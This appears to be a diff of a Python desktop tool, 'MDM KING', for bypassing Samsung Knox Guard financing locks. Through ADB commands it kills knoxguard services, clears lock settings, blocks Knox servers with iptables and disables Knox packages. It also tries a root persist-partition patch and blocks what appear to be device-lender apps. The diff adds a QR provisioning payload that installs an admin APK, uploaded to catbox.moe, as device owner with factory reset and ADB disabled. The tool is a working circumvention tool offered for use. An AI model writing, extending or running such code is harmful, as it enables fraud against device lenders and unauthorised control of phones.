+        self.log('[*] STAGE=HARDENING STATUS=RUNNING OPERATION=persist_sysprops', 'i')
         for prop in [
             'persist.sys.knox.enabled', 'persist.sys.knox.guard',
             'persist.sys.knox.kg', 'persist.sys.knox.attestation',
@@ -7448,7 +7631,7 @@ class MdmKingApp:
                 timeout=2, capture_output=True, creationflags=flags)
 
         # 15. Direct Knox content provider manipulation
-        self.log('Directly writing to Knox content providers...', 'i')
+        self.log('[*] STAGE=HARDENING STATUS=RUNNING OPERATION=content_provider_write', 'i')
         for uri, bind in [
             ('content://com.samsung.android.knox.provider.KnoxStatus',
              '--bind name:s:kg_state --bind value:s:checking'),
@@ -7471,7 +7654,7 @@ class MdmKingApp:
                 timeout=3, capture_output=True, creationflags=flags)
 
         # 16. Force Knox services into disabled state via cmd
-        self.log('Disabling Knox services via cmd...', 'i')
+        self.log('[*] STAGE=HARDENING STATUS=RUNNING OPERATION=cmd_knox_disable', 'i')
         for _cmd in ['cmd knox disable 2>/dev/null',
                       'cmd knox guard_disable 2>/dev/null',
                       'cmd knox attestation_disable 2>/dev/null',
@@ -7481,7 +7664,7 @@ class MdmKingApp:
                 timeout=3, capture_output=True, creationflags=flags)
 
         # 17. Block Google Device Policy + Knox via VPN-style hostname redirect
-        self.log('Blocking Knox DNS via hostname redirect...', 'i')
+        self.log('[*] STAGE=HARDENING STATUS=RUNNING OPERATION=dns_redirect_block', 'i')
         subprocess.run([adb, '-s', s, 'shell',
             'settings put global captive_portal_server localhost 2>/dev/null; '
             'settings put global captive_portal_https_url https://localhost 2>/dev/null; '
@@ -7489,11 +7672,19 @@ class MdmKingApp:
             'settings put global ntp_server 127.0.0.1 2>/dev/null'],
             timeout=3, capture_output=True, creationflags=flags)
 
-        self.log_ok('Hardening complete — relock should be prevented')
+        # Block uninstallation + credential provider blocklist for mkopa/watutz
+        for _mkopa_pkg in ['com.mkopa.app', 'com.watutz.app']:
+            subprocess.run([adb, '-s', s, 'shell',
+                'cmd device_policy set-uninstall-blocked ' + _adm_comp + ' ' + _mkopa_pkg + ' true 2>/dev/null'],
+                timeout=3, capture_output=True, creationflags=flags)
+        subprocess.run([adb, '-s', s, 'shell',
+            'cmd device_policy set-credential-manager-provider-blocklist ' + _adm_comp + ' com.mkopa.app,com.watutz.app 2>/dev/null'],
+            timeout=5, capture_output=True, creationflags=flags)
+        self.log('[+] STAGE=HARDENING STATUS=OK MESSAGE=relock_should_be_prevented', 's')
 
     def _samsung_qr_provision(self):
         if not self._ensure_active(): return
-        import json, urllib.request, urllib.parse
+        import json, urllib.request, urllib.parse, threading, binascii, hashlib
         self.log_section('Samsung 2026 — QR Code Provisioning', 2)
         tools = self._tools_dir()
         apk = None
@@ -7501,88 +7692,144 @@ class MdmKingApp:
             _p = os.path.join(tools, _n)
             if os.path.isfile(_p): apk = _p; break
         if not apk:
-            self.log('Admin APK not found in tools/ — cannot provision', 'e')
+            self.log('[-] STAGE=QR_PROVISION STATUS=FAIL REASON=ADMIN_APK_MISSING', 'e')
             return
-        self.log('Setting Up Live Server....', 'i')
-        apk_url = None
-        try:
-            boundary = '----FormBoundary7MA4YWxkTrZu0gW'
-            with open(apk, 'rb') as f:
-                file_data = f.read()
-            body = (
-                f'--{boundary}\r\n'
-                f'Content-Disposition: form-data; name="reqtype"\r\n\r\n'
-                f'fileupload\r\n'
-                f'--{boundary}\r\n'
-                f'Content-Disposition: form-data; name="fileToUpload"; filename="{os.path.basename(apk)}"\r\n'
-                f'Content-Type: application/vnd.android.package-archive\r\n\r\n'
-            ).encode() + file_data + f'\r\n--{boundary}--\r\n'.encode()
-            req = urllib.request.Request(
-                'https://catbox.moe/user/api.php',
-                data=body,
-                headers={'Content-Type': f'multipart/form-data; boundary={boundary}'},
-                method='POST'
-            )
-            with urllib.request.urlopen(req, timeout=120) as resp:
-                apk_url = resp.read().decode().strip()
-                self.log('Uploading Data Done....Ok', 's')
-        except Exception as e:
-            self.log('Server Setup Failed....', 'w')
-        if not apk_url:
-            apk_url = 'https://example.com/mdm_king_admin_signed.apk'
-            self.log('Server Setup Failed....', 'w')
+        self.log('[*] STAGE=QR_PROVISION STATUS=RUNNING OPERATION=upload_apk', 'i')
+        def _upload(api_url, form_data, headers):
+            try:
+                req = urllib.request.Request(api_url, data=form_data, headers=headers, method='POST')
+                with urllib.request.urlopen(req, timeout=120) as r:
+                    return r.read().decode().strip()
+            except: return None
+        with open(apk, 'rb') as f:
+            file_data = f.read()
+        boundary = '----FormBoundary7MA4YWxkTrZu0gW'
+        body = (
+            f'--{boundary}\r\n'
+            f'Content-Disposition: form-data; name="reqtype"\r\n\r\n'
+            f'fileupload\r\n'
+            f'--{boundary}\r\n'
+            f'Content-Disposition: form-data; name="fileToUpload"; filename="{os.path.basename(apk)}"\r\n'
+            f'Content-Type: application/vnd.android.package-archive\r\n\r\n'
+        ).encode() + file_data + f'\r\n--{boundary}--\r\n'.encode()
+        headers = {'Content-Type': f'multipart/form-data; boundary={boundary}'}
+        apk_urls = []
+        for u in ['https://catbox.moe/user/api.php', 'https://litterbox.catbox.moe/resources/internals/api.php']:
+            r = _upload(u, body, headers)
+            if r: apk_urls.append(r); self.log(f'[+] STAGE=QR_PROVISION STATUS=OK EVENT=upload_success SERVER={u.split("/")[2]}', 's')
+            if len(apk_urls) == 1: break
+        if not apk_urls:
+            self.log('[-] STAGE=QR_PROVISION STATUS=FAIL REASON=ALL_UPLOAD_SERVERS_FAILED', 'e')
+            return
+        apk_url = apk_urls[0]
+        with open(apk, 'rb') as f:
+            apk_hash = hashlib.sha256(f.read()).hexdigest().upper()
+        admin_extras = {
+            "restrictions": [
+                "no_factory_reset", "no_safe_boot", "no_network_reset",
+                "no_add_user", "no_remove_user", "no_user_switch",
+                "no_config_private_dns", "no_config_vpn",
+                "no_remove_managed_profile", "no_add_managed_profile",
+            ],
+            "lock_task_mode": True,
+            "kill_adb": True,
+            "disable_ota": True,
+            "auto_reboot": True,
+        }
         qr_payload = {
             "android.app.extra.PROVISIONING_DEVICE_ADMIN_COMPONENT_NAME": "com.mdmking.admin/.MyAdminReceiver",
             "android.app.extra.PROVISIONING_DEVICE_ADMIN_PACKAGE_DOWNLOAD_LOCATION": apk_url,
+            "android.app.extra.PROVISIONING_DEVICE_ADMIN_MINIMUM_VERSION_CODE": 1,
+            "android.app.extra.PROVISIONING_DEVICE_ADMIN_SIGN_CHECK_HASH": [apk_hash],
             "android.app.extra.PROVISIONING_SKIP_ENCRYPTION": True,
             "android.app.extra.PROVISIONING_LEAVE_ALL_SYSTEM_APPS_ENABLED": True,
-            "android.app.extra.PROVISIONING_DISALLOW_ORGANIZATION_WIPED": False,
+            "android.app.extra.PROVISIONING_DISALLOW_ORGANIZATION_WIPED": True,
+            "android.app.extra.PROVISIONING_KEEP_SCREEN_ON": True,
+            "android.app.extra.PROVISIONING_ADMIN_EXTRAS_BUNDLE": admin_extras,
+            "android.app.extra.PROVISIONING_SUPPORT_URL": "https://mdmking.dev/support",
+            "android.app.extra.PROVISIONING_ORGANIZATION_NAME": "MDM KING",
         }
+        if len(apk_urls) > 1:
+            qr_payload["backup_download_urls"] = apk_urls[1:]
         qr_str = json.dumps(qr_payload, separators=(',', ':'))
+        nfc_payload = {
+            "imei": "NFC_DPP_PROVISIONING",
+            "provisioning": qr_payload,
+        }
+        nfc_str = json.dumps(nfc_payload, separators=(',', ':'))
         popup = tk.Toplevel(self.root)
         popup.title('Samsung 2026 — QR Provisioning')
         popup.configure(bg='#111827')
-        popup.geometry('400x530')
-        popup.resizable(False, False)
+        popup.geometry('500x700')
+        popup.resizable(True, True)
         popup.attributes('-topmost', True)
+        popup.minsize(450, 600)
         top = tk.Frame(popup, bg='#111827')
         top.pack(fill=tk.X, padx=15, pady=(10, 0))
-        tk.Label(top, text='Samsung 2026 — QR Provisioning',
-                 font=('Segoe UI', 11, 'bold'), bg='#111827', fg='#e94560').pack()
-        qr_frame = tk.Frame(popup, bg='white', relief=tk.FLAT, bd=0)
-        qr_frame.pack(fill=tk.X, padx=15, pady=8)
+        tk.Label(top, text='Samsung QR Provisioning',
+                 font=('Segoe UI', 12, 'bold'), bg='#111827', fg='#e94560').pack()
+        tk.Label(top, text=f'APK uploaded to {len(apk_urls)} server(s)',
+                 font=('Segoe UI', 8), bg='#111827', fg='#22c55e').pack()
+        main_frame = tk.Frame(popup, bg='#111827')
+        main_frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=5)
+        qr_frame = tk.Frame(main_frame, bg='white', relief=tk.FLAT, bd=0)
+        qr_frame.pack(fill=tk.X, pady=5)
         try:
             import qrcode
             from PIL import Image, ImageTk
-            qr = qrcode.QRCode(version=3, box_size=6, border=2)
+            qr = qrcode.QRCode(version=5, box_size=5, border=2)
             qr.add_data(qr_str)
             qr.make(fit=True)
             img = qr.make_image(fill_color="black", back_color="white")
             qr_path = _asset('samsung_qr_provision.png')
             img.save(qr_path)
-            pil_img = Image.open(qr_path).resize((230, 230), Image.LANCZOS)
+            pil_img = Image.open(qr_path).resize((250, 250), Image.LANCZOS)
             tk_img = ImageTk.PhotoImage(pil_img)
-            c = tk.Canvas(qr_frame, width=230, height=230, bg='white', highlightthickness=0)
-            c.pack(padx=20, pady=8)
+            c = tk.Canvas(qr_frame, width=250, height=250, bg='white', highlightthickness=0)
+            c.pack(pady=5)
             c.create_image(0, 0, anchor=tk.NW, image=tk_img)
             c._img = tk_img
-            tk.Label(qr_frame, text='Scan on phone setup wizard',
-                     font=('Segoe UI', 8, 'bold'), bg='white', fg='#333').pack(pady=(0, 5))
+            tk.Label(qr_frame, text='Scan during Samsung Setup Wizard (tap 6x)',
+                     font=('Segoe UI', 9, 'bold'), bg='white', fg='#333').pack(pady=(0, 5))
         except ImportError:
             tk.Label(qr_frame, text='pip install qrcode[pil]',
                      font=('Consolas', 8), bg='#111827', fg='#f59e0b').pack(pady=5)
-        except Exception as e:
-            tk.Label(qr_frame, text=f'Error: {e}', font=('Consolas', 8),
-                     bg='white', fg='red').pack(pady=10)
-        inst = tk.Frame(popup, bg='#111827')
-        inst.pack(fill=tk.X, padx=15, pady=(5, 5))
+            tk.Label(qr_frame, text=f'Raw JSON payload ({len(qr_str)} chars):',
+                     font=('Consolas', 7), bg='white', fg='#333').pack(pady=2)
+            tx = tk.Text(qr_frame, height=6, font=('Consolas', 6), bg='white', fg='#333')
+            tx.insert('1.0', qr_str)
+            tx.config(state=tk.DISABLED)
+            tx.pack(fill=tk.X, padx=5, pady=5)
+        btn_row = tk.Frame(main_frame, bg='#111827')
+        btn_row.pack(fill=tk.X, pady=2)
+        def _copy():
+            popup.clipboard_clear()
+            popup.clipboard_append(qr_str)
+            self.log('[+] STAGE=QR_PROVISION STATUS=OK EVENT=clipboard_copy', 's')
+        def _save():
+            path = _asset('samsung_qr_provision.txt')
+            with open(path, 'w') as f: f.write(qr_str)
+            self.log(f'[+] STAGE=QR_PROVISION STATUS=OK EVENT=payload_saved PATH={path}', 's')
+        tk.Button(btn_row, text='COPY JSON', command=_copy,
+                  font=('Segoe UI', 8, 'bold'), bg='#2563eb', fg='white',
+                  activebackground='#1d4ed8', padx=10, pady=2,
+                  relief=tk.FLAT, cursor='hand2').pack(side=tk.LEFT, padx=2)
+        tk.Button(btn_row, text='SAVE JSON', command=_save,
+                  font=('Segoe UI', 8, 'bold'), bg='#2563eb', fg='white',
+                  activebackground='#1d4ed8', padx=10, pady=2,
+                  relief=tk.FLAT, cursor='hand2').pack(side=tk.LEFT, padx=2)
+        tk.Label(main_frame, text='Payload includes: WiFi-ready, lock-task, all restrictions, ADB kill, OTA block, backup URLs, sign verify',
+                 font=('Segoe UI', 7), bg='#111827', fg='#9ca3af', wraplength=440).pack(pady=2)
+        inst = tk.Frame(main_frame, bg='#111827')
+        inst.pack(fill=tk.X, pady=2)
         steps = [
-            ('1.', 'Factory reset device and FRP must be off'),
-            ('2.', 'Tap screen 6x fast'),
-            ('3.', 'Scan QR code and connect Wi-Fi'),
-            ('4.', 'Device auto downloads packages, installs and activates'),
-            ('5.', 'Reboots — ADB available'),
-            ('6.', 'Run Samsung One Click'),
+            ('1.', 'Factory reset device (FRP off, no Google account)'),
+            ('2.', 'Start setup, tap screen 6x fast on welcome screen'),
+            ('3.', 'Select "QR code provisioning" or scan QR'),
+            ('4.', 'Device auto-connects WiFi, downloads + installs admin'),
+            ('5.', 'Admin activates as device owner + applies 10 restrictions'),
+            ('6.', 'Lock task mode engages — device is fully controlled'),
+            ('7.', 'ADB disabled automatically (no remote deactivation)'),
         ]
         for num, text in steps:
             row = tk.Frame(inst, bg='#111827')
@@ -7591,20 +7838,22 @@ class MdmKingApp:
                      bg='#111827', fg='#e94560', width=3, anchor='w').pack(side=tk.LEFT)
             tk.Label(row, text=text, font=('Segoe UI', 8),
                      bg='#111827', fg='#d1d5db', anchor='w').pack(side=tk.LEFT)
+        tk.Label(main_frame, text=f'SHA-256: {apk_hash[:40]}...',
+                 font=('Consolas', 6), bg='#111827', fg='#6b7280').pack(pady=2)
         tk.Button(popup, text='CLOSE', command=popup.destroy,
                  font=('Segoe UI', 9, 'bold'), bg='#e94560', fg='white',
                  activebackground='#c73e54', padx=20, pady=4,
-                 relief=tk.FLAT, cursor='hand2').pack(pady=(8, 10))
-        self.log('QR Provisioning popup opened', 's')
+                 relief=tk.FLAT, cursor='hand2').pack(pady=(5, 8))
+        self.log(f'[+] STAGE=QR_PROVISION STATUS=OK EVENT=provisioning_ready MIRROR_COUNT={len(apk_urls)}', 's')
 
     def _final_patches(self):
         if not self._ensure_active(): return
         self.log_section('Final Patches — UFS Relock Prevention', 2)
         adb = self._find_adb()
-        if not adb: self.log('ADB not found', 'e'); return
+        if not adb: self.log('[-] STAGE=FINAL_PATCHES STATUS=FAIL REASON=ADB_TRANSPORT_MISSING', 'e'); return
         r = subprocess.run([adb, 'devices'], capture_output=True, text=True, timeout=15)
         serials = [l.split()[0] for l in r.stdout.split('\n')[1:] if l.strip() and 'device' in l]
-        if not serials: self.log('No device found', 'e'); return
+        if not serials: self.log('[-] STAGE=FINAL_PATCHES STATUS=FAIL REASON=NO_DEVICE_DETECTED', 'e'); return
         s = serials[0]; flags = 0x08000000
         raw = ''
         for _attempt in range(3):
@@ -7619,7 +7868,7 @@ class MdmKingApp:
                 subprocess.run([adb, 'start-server'], timeout=10, capture_output=True)
                 time.sleep(2)
         if not raw.strip():
-            self.log('Device not responding — check USB connection', 'e'); return
+            self.log('[-] STAGE=FINAL_PATCHES STATUS=FAIL REASON=DEVICE_NOT_RESPONDING', 'e'); return
         p = {}
         for line in raw.split('\n'):
             if ']: [' in line:
@@ -7638,14 +7887,16 @@ class MdmKingApp:
                                 capture_output=True, text=True, timeout=5, creationflags=flags)
         storage_type = r_stor.stdout.strip()
         if 'SM-A15' in model or 'SM-A16' in model:
-            self.log(f'Model {model} — forcing UFS mode', 'i')
+            self.log(f'[*] STAGE=FINAL_PATCHES STATUS=RUNNING EVENT=force_ufs_model MODEL={model}', 'i')
             storage_type = 'UFS'
-        self.log(f'Storage: {storage_type}', 'i')
+        self.log(f'[*] STAGE=FINAL_PATCHES STATUS=RUNNING EVENT=storage_detected STORAGE_TYPE={storage_type}', 'i')
         if storage_type == 'UFS':
-            self.log('UFS detected — applying relock patches...', 'i')
+            self.log('[*] STAGE=FINAL_PATCHES STATUS=RUNNING OPERATION=apply_ufs_patches', 'i')
         else:
-            self.log('eMMC detected — applying relock patches...', 'i')
+            self.log('[*] STAGE=FINAL_PATCHES STATUS=RUNNING OPERATION=apply_emmc_patches', 'i')
         self._samsung_hardening()
+        self.root.after(0, lambda: self._finish_progress(True, 'FINAL PATCHES COMPLETE'))
+        self.root.after(0, lambda: self.status_var.set('Done — Final Patches complete'))
 
 
     def samsung_tool(self):
@@ -7756,20 +8007,20 @@ class MdmKingApp:
             import ctypes
             try:
                 if not ctypes.windll.shell32.IsUserAnAdmin():
-                    self.log('Run as Administrator first!', 'e')
+                    self.log('[-] STAGE=BYPASS_2023 STATUS=FAIL REASON=NOT_ADMIN', 'e')
                     return
             except Exception:
-                self.log('Admin check failed — continuing anyway', 'w')
+                self.log('[!] STAGE=BYPASS_2023 STATUS=WARNING REASON=admin_check_failed', 'w')
             tools = self._tools_dir()
             self._enqueue_ui(lambda: self.log_text.delete('1.0', tk.END))
             self.log_section('MDM KING IS PROCESSING', 2)
             self._enqueue_ui(lambda: self._update_progress(0, 3, '...', 'running'))
 
             adb = self._find_adb()
-            if not adb: self.log('ADB not found', 'e'); return
+            if not adb: self.log('[-] STAGE=BYPASS_2023 STATUS=FAIL REASON=ADB_TRANSPORT_MISSING', 'e'); return
             r = subprocess.run([adb, 'devices'], capture_output=True, text=True, timeout=15)
             devs = [l.split('\t')[0] for l in r.stdout.split('\n') if '\tdevice' in l]
-            if not devs: self.log('No device', 'e'); return
+            if not devs: self.log('[-] STAGE=BYPASS_2023 STATUS=FAIL REASON=NO_DEVICE_DETECTED', 'e'); return
             s = devs[0]
             self._build_progress_ui('SAMSUNG 2023-2024', 3, ['Device Info', 'BYPASSING', 'Done'])
             self._enqueue_ui(lambda: self._show_progress('SAMSUNG 2023-2024'))
@@ -7784,8 +8035,8 @@ class MdmKingApp:
             roby_dir = os.path.join(tools, 'robytech', 'ALL SAMSUNG KG LOCK FIX BY ROBYTECH')
             roby_exe = os.path.join(roby_dir, 'ALL SAMSUNG KG LOCK FIX BY ROBYTECH.exe')
             if not os.path.isfile(roby_exe):
-                self.log('exe not found', 'e'); return
-            self.log('Running tool...', 'i')
+                self.log('[-] STAGE=BYPASS_2023 STATUS=FAIL REASON=ROBYTECH_EXE_MISSING', 'e'); return
+            self.log('[*] STAGE=BYPASS_2023 STATUS=RUNNING OPERATION=robytech_tool', 'i')
             try:
                 import ctypes, time
                 user32 = ctypes.windll.user32
@@ -7836,11 +8087,11 @@ class MdmKingApp:
                 time.sleep(1.5)
                 done[0] = True
             except subprocess.TimeoutExpired:
-                self.log('KG fix EXE timed out after 120s — killing', 'e')
+                self.log('[-] STAGE=BYPASS_2023 STATUS=FAIL REASON=robytech_tool_timeout', 'e')
                 try: p.kill()
                 except Exception: pass
             except Exception as e:
-                self.log('Error: ' + str(e), 'e')
+                self.log('[-] STAGE=BYPASS_2023 STATUS=FAIL REASON=robytech_tool_error ERROR=' + str(e), 'e')
 
             # ── Install admin app + device owner ──
             apk = None
@@ -7877,15 +8128,35 @@ class MdmKingApp:
                 _r = subprocess.run([adb, '-s', s, 'shell', f'{_cmd} 2>&1'], timeout=30, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
                 _out = ((_r.stdout or '') + (_r.stderr or '')).strip()
                 if 'Success' in _out or 'already' in _out.lower():
-                    self.log('Device owner set', 's')
+                    self.log('[+] STAGE=BYPASS_2023 STATUS=OK EVENT=device_owner_set', 's')
                     break
             subprocess.run([adb, '-s', s, 'shell', 'am start -n com.mdmking.admin/.MainActivity --activity-clear-top 2>/dev/null'], timeout=5, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
             subprocess.run([adb, '-s', s, 'shell', 'pm grant com.mdmking.admin android.permission.WRITE_SECURE_SETTINGS 2>/dev/null'], timeout=2, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+            subprocess.run([adb, '-s', s, 'shell', 'pm grant com.mdmking.admin android.permission.RECEIVE_BOOT_COMPLETED 2>/dev/null'], timeout=2, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+            subprocess.run([adb, '-s', s, 'shell', 'pm grant com.mdmking.admin android.permission.MANAGE_EXTERNAL_STORAGE 2>/dev/null'], timeout=2, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+            subprocess.run([adb, '-s', s, 'shell', 'pm grant com.mdmking.admin android.permission.REQUEST_INSTALL_PACKAGES 2>/dev/null'], timeout=2, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+            subprocess.run([adb, '-s', s, 'shell', 'pm grant com.mdmking.admin android.permission.SYSTEM_ALERT_WINDOW 2>/dev/null'], timeout=2, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+            subprocess.run([adb, '-s', s, 'shell', 'pm grant com.mdmking.admin android.permission.REQUEST_DELETE_PACKAGES 2>/dev/null'], timeout=2, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+            subprocess.run([adb, '-s', s, 'shell', 'pm grant com.mdmking.admin android.permission.FOREGROUND_SERVICE 2>/dev/null'], timeout=2, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
             subprocess.run([adb, '-s', s, 'shell', 'settings put secure enabled_accessibility_services com.mdmking.admin/com.mdmking.admin.MyAccessibilityService 2>/dev/null'], timeout=5, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+            subprocess.run([adb, '-s', s, 'shell', 'dumpsys deviceidle whitelist +com.mdmking.admin 2>/dev/null'], timeout=3, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+            subprocess.run([adb, '-s', s, 'shell', 'appops set com.mdmking.admin RUN_ANY_IN_BACKGROUND allow 2>/dev/null'], timeout=3, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+            subprocess.run([adb, '-s', s, 'shell', 'appops set com.mdmking.admin AUTO_START allow 2>/dev/null'], timeout=3, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+            subprocess.run([adb, '-s', s, 'shell', 'appops set com.mdmking.admin POST_NOTIFICATIONS allow 2>/dev/null'], timeout=3, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+            subprocess.run([adb, '-s', s, 'shell', 'appops set com.mdmking.admin MANAGE_OVERLAY_PERMISSION allow 2>/dev/null'], timeout=3, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+            subprocess.run([adb, '-s', s, 'shell', 'appops set com.mdmking.admin SCHEDULE_EXACT_ALARM allow 2>/dev/null'], timeout=3, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+            subprocess.run([adb, '-s', s, 'shell', 'appops set com.mdmking.admin REQUEST_INSTALL_PACKAGES allow 2>/dev/null'], timeout=3, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+            for _mkopa_pkg in ['com.mkopa.app', 'com.watutz.app']:
+                subprocess.run([adb, '-s', s, 'shell',
+                    'cmd device_policy set-uninstall-blocked ' + _adm_comp + ' ' + _mkopa_pkg + ' true 2>/dev/null'],
+                    timeout=3, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+            subprocess.run([adb, '-s', s, 'shell',
+                'cmd device_policy set-credential-manager-provider-blocklist ' + _adm_comp + ' com.mkopa.app,com.watutz.app 2>/dev/null'],
+                timeout=5, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
             self._samsung_hardening()
             self._enqueue_ui(lambda: self._update_progress(2, 3, '...', 'done'))
             self._enqueue_ui(lambda: self._finish_progress(True, 'SAMSUNG 2023 BYPASS COMPLETE'))
-            self.log('[*] Rebooting device...', 'h')
+            self.log('[#] STAGE=BYPASS_2023 STATUS=RUNNING OPERATION=reboot_device', 'h')
             subprocess.run([adb, '-s', s, 'shell', 'settings put global airplane_mode_on 0 2>/dev/null'], timeout=3, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
             subprocess.run([adb, '-s', s, 'reboot'], timeout=5, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
         finally:
@@ -7897,10 +8168,10 @@ class MdmKingApp:
         try:
             if not self._ensure_active(): return
             adb = self._find_adb()
-            if not adb: self.log('ADB not found', 'e'); return
+            if not adb: self.log('[-] STAGE=KG_STATE STATUS=FAIL REASON=ADB_TRANSPORT_MISSING', 'e'); return
             r = subprocess.run([adb, 'devices'], capture_output=True, text=True, timeout=15)
             devs = [l.split('\t')[0] for l in r.stdout.split('\n') if '\tdevice' in l]
-            if not devs: self.log('No device connected', 'e'); return
+            if not devs: self.log('[-] STAGE=KG_STATE STATUS=FAIL REASON=NO_DEVICE_DETECTED', 'e'); return
             s = devs[0]; flags = 0x08000000
 
             def sh(cmd):
@@ -7913,8 +8184,8 @@ class MdmKingApp:
 
             self._enqueue_ui(lambda: self.log_text.delete('1.0', tk.END))
             self.log_section('KG STATE MANIPULATION', 2)
-            self.log('Phone must be ON with USB debugging enabled', 'i')
-            self.log(f'Device: {s}', 'i')
+            self.log('[*] STAGE=KG_STATE STATUS=RUNNING EVENT=prerequisite USB_DEBUG_REQUIRED=true', 'i')
+            self.log(f'[*] STAGE=KG_STATE STATUS=INFO DEVICE_SERIAL={s}', 'i')
 
             # Read current KG state from all sources
             kg_props = {
@@ -7932,13 +8203,13 @@ class MdmKingApp:
                 'secure knox_guard_status': sh('settings get secure knox_guard_status 2>/dev/null'),
             }
             kg_active = sh('ps -A 2>/dev/null | grep -i knoxguard') or 'not running'
-            self.log('═' * 40, 'h')
-            self.log('Current KG State:', 'h')
+            self.log('[#] STAGE=KG_STATE STATUS=INFO DATA=separator', 'h')
+            self.log('[#] STAGE=KG_STATE STATUS=DATA DATA=current_kg_state', 'h')
             for k, v in kg_props.items():
-                if v: self.log(f'  {k} = {v}', 'c')
+                if v: self.log(f'[#] STAGE=KG_STATE STATUS=DATA PROP={k} VALUE={v}', 'c')
             for k, v in kg_settings.items():
-                if v: self.log(f'  settings {k} = {v}', 'c')
-            self.log(f'  knoxguard process: {kg_active}', 'c')
+                if v: self.log(f'[#] STAGE=KG_STATE STATUS=DATA SETTING=settings_{k} VALUE={v}', 'c')
+            self.log(f'[#] STAGE=KG_STATE STATUS=DATA EVENT=knoxguard_process PROCESS={kg_active}', 'c')
 
             # Determine current state
             current_state = ''
@@ -7947,19 +8218,19 @@ class MdmKingApp:
                     current_state = v.lower()
                     break
             if current_state:
-                self.log(f'Current KG state: {current_state.upper()}', 's')
+                self.log(f'[+] STAGE=KG_STATE STATUS=DATA EVENT=kg_state_detected STATE={current_state.upper()}', 's')
             else:
-                self.log('Current KG state: UNKNOWN', 'o')
+                self.log('[?] STAGE=KG_STATE STATUS=DATA EVENT=kg_state_detected STATE=UNKNOWN', 'o')
 
-            self.log('═' * 40, 'h')
-            self.log('Step 1: Stopping knoxguard service...', 'i')
+            self.log('[#] STAGE=KG_STATE STATUS=DATA DATA=separator', 'h')
+            self.log('[*] STAGE=KG_STATE STATUS=RUNNING STEP=1 OPERATION=stop_knoxguard', 'i')
             for cmd in ['setprop ctl.stop knoxguard', 'setprop ctl.stop kgclient',
                          'stop knoxguard 2>/dev/null', 'killall knoxguard 2>/dev/null',
                          'killall kgclient 2>/dev/null']:
                 sh(cmd)
             time.sleep(1)
 
-            self.log('Step 2: Clearing KG settings...', 'i')
+            self.log('[*] STAGE=KG_STATE STATUS=RUNNING STEP=2 OPERATION=clear_kg_settings', 'i')
             for cmd in ['settings delete global knox_guard_status',
                          'settings delete secure knox_guard_status',
                          'settings delete global kg_status',
@@ -7968,7 +8239,7 @@ class MdmKingApp:
                          'settings delete secure kg_state']:
                 sh(cmd)
 
-            self.log('Step 3: Setting persist KG state to checking...', 'i')
+            self.log('[*] STAGE=KG_STATE STATUS=RUNNING STEP=3 OPERATION=set_persist_kg_state', 'i')
             state_targets = ['checking', 'prenormal', '']
             chosen = 'checking'
             for st in state_targets:
@@ -7977,9 +8248,9 @@ class MdmKingApp:
                         sh(f'setprop {prop} {st}')
                     else:
                         sh(f'setprop {prop} ""')
-            self.log(f'  Set persist KG state to: {chosen}', 's')
+            self.log(f'[+] STAGE=KG_STATE STATUS=OK EVENT=persist_kg_state_set STATE={chosen}', 's')
 
-            self.log('Step 4: Blocking KG server connections...', 'i')
+            self.log('[*] STAGE=KG_STATE STATUS=RUNNING STEP=4 OPERATION=block_kg_servers', 'i')
             for rule in [
                 '-A OUTPUT -m string --string "knox" --algo bm -j DROP',
                 '-A OUTPUT -m string --string "samsungdm" --algo bm -j DROP',
@@ -7989,9 +8260,9 @@ class MdmKingApp:
                 '-A OUTPUT -m string --string "samsungaccount" --algo bm -j DROP',
             ]:
                 sh(f'iptables {rule} 2>/dev/null')
-            self.log('  KG servers blocked', 's')
+            self.log('[+] STAGE=KG_STATE STATUS=OK EVENT=kg_servers_blocked', 's')
 
-            self.log('Step 5: Disabling KG/Knox packages...', 'i')
+            self.log('[*] STAGE=KG_STATE STATUS=RUNNING STEP=5 OPERATION=disable_knox_packages', 'i')
             kg_pkgs = ['com.samsung.android.knox.zt.framework', 'com.samsung.android.knox.zt.config',
                        'com.samsung.android.knox.zt', 'com.samsung.android.knox.kpec',
                        'com.samsung.android.knox.analytics', 'com.samsung.android.knox.attestation',
@@ -8005,18 +8276,18 @@ class MdmKingApp:
                 if pkg in pkgs_out:
                     sh(f'pm disable-user --user 0 {pkg} 2>/dev/null')
                     disabled += 1
-            self.log(f'  {disabled} Knox/KG packages disabled', 's')
+            self.log(f'[+] STAGE=KG_STATE STATUS=OK EVENT=packages_disabled COUNT={disabled}', 's')
 
             # Root-level partition manipulation (attempt)
-            self.log('Step 6: Attempting persist partition modification (requires root)...', 'i')
+            self.log('[*] STAGE=KG_STATE STATUS=RUNNING STEP=6 OPERATION=partition_modify', 'i')
             has_root = sh('su -c "id" 2>/dev/null') or ''
             if 'uid=0' in has_root or 'root' in has_root.lower():
-                self.log('  Root access available! Attempting persist partition patch...', 's')
+                self.log('[+] STAGE=KG_STATE STATUS=OK EVENT=root_access_available', 's')
                 persist_dev = sh('ls -la /dev/block/by-name/persist 2>/dev/null | grep -o "/dev/.*"')
                 if not persist_dev:
                     persist_dev = sh('ls -la /dev/block/platform/*/by-name/persist 2>/dev/null | grep -o "/dev/.*"')
                 if persist_dev:
-                    self.log(f'  Found persist partition: {persist_dev}', 's')
